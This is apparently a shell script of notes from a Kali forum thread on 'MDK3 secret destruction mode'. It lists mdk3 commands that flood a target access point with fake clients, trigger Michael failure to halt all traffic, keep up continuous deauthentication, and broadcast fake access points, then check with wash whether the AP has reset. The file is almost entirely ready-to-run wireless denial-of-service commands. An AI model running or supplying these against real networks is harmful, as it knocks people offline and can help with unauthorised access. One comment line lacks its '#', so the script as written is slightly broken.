#!/bin/sh
# https://forums.kali.org/showthread.php?19498-MDK3-Secret-Destruction-Mode

mdk3 monX a -a xx:xx:xx:xx:xx:xx -m
#This floods the target AP with fake clients.
mdk3 monX m -t xx:xx:xx:xx:xx:xx
#This causes Michael failure, stopping all wireless traffic. However, this only works if the target AP supports TKIP. (Can be AES+TKIP)
mdk3 monX d -b blacklist -c X
#This keeps a continuous deauth on the network. If this attack does not start, make a blank text document in your root folder named blacklist. Leave it empty as MDK3 automatically populates the list.
mdk3 monX b -t xx:xx:xx:xx:xx:xx -c X
This floods a bunch of fake APs to any clients in range (only effective to windows clients and maybe some other devices, Macs are protected against this).

#You will know when the AP has reset either by checking with
wash -i monX -C



Mdk3:

sudo mdk3 mon0 a -a 00:11:22:33:44:55 -m
sudo mdk3 mon0 b -a 00:11:22:33:44:55 -n " name_of_AP" -h -c [no of channel]
sudo mdk3 mon0 d -a 00:11:22:33:44:55 -c [no of channel]
sudo mdk3 mon0 m -t 00:11:22:33:44:55

Then test with:

sudo wash -i mon0 -C
